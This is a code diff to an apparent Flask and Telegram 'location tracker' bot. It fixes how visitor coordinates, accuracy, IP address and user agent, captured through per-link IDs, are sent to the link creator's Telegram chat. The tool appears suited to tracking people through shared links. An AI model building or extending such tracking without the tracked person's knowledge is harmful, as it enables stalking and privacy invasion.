@@ -6,7 +6,7 @@ import pkgutil
 import asyncio
 from datetime import datetime
 from flask import Flask, request, jsonify
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler
 
 # Fix for Python 3.14 - Flask compatibility
@@ -338,6 +338,7 @@ def capture_location():
     user_agent = data.get('user_agent')
     ip_address = request.remote_addr
     
+    # Save to database
     conn = sqlite3.connect('location_tracker.db')
     c = conn.cursor()
     c.execute("""INSERT INTO locations 
@@ -345,27 +346,45 @@ def capture_location():
                  VALUES (?, ?, ?, ?, ?, ?, ?)""",
               (link_id, latitude, longitude, accuracy, datetime.now(), user_agent, ip_address))
     
+    # Get chat_id
     c.execute("SELECT chat_id FROM links WHERE link_id = ?", (link_id,))
     result = c.fetchone()
     conn.commit()
     conn.close()
     
+    # Send notification to user
     if result:
         chat_id = result[0]
         try:
-            from telegram import Bot
-            import asyncio
+            # Create bot instance
             bot = Bot(token=TELEGRAM_TOKEN)
-            # Send location and message asynchronously
-            asyncio.create_task(bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude))
-            asyncio.create_task(bot.send_message(
-                chat_id=chat_id,
-                text=f"📍 Location Captured!\n\nCoordinates: {latitude:.6f}, {longitude:.6f}",
-                parse_mode=None
+            
+            # Create new event loop for this request
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            
+            # Send location
+            loop.run_until_complete(bot.send_location(
+                chat_id=chat_id, 
+                latitude=latitude, 
+                longitude=longitude
             ))
-            print(f"Location sent to chat_id: {chat_id}")
+            
+            # Send message
+            loop.run_until_complete(bot.send_message(
+                chat_id=chat_id,
+                text=f"📍 *Location Captured!*\n\n"
+                     f"Coordinates: {latitude:.6f}, {longitude:.6f}\n"
+                     f"Accuracy: {accuracy} meters\n"
+                     f"Link ID: {link_id[:12]}...",
+                parse_mode='Markdown'
+            ))
+            
+            loop.close()
+            print(f"✅ Location sent to chat_id: {chat_id}")
+            
         except Exception as e:
-            print(f"Error sending location: {e}")
+            print(f"❌ Error sending location: {e}")
     
     return jsonify({'success': True})
 
